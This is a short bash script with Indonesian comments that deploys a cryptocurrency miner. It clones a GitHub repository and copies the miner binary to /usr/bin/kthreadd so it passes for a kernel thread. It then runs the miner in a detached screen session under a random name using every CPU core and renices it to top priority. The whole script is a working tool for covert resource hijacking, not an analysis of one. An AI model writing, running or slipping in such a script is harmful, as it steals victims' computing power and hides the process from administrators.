#!/bin/bash

# Nama proses screen random
RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Instal dependensi
apt-get update -y
apt-get install -y wget tar screen curl git

# Clone dan jalankan miner
git clone https://github.com/amirul5656/webjs.git
cd webjs
chmod +x asd

# Duplikat jadi nama sistem
cp ./asd /usr/bin/kthreadd

# Jalankan miner
screen -dmS $RAND_NAME /usr/bin/kthreadd -t $(nproc)

# Set prioritas tinggi
renice -20 -p $(pgrep -f $RAND_NAME)

echo "🚀 Miner sedang berjalan di dalam screen: $RAND_NAME"
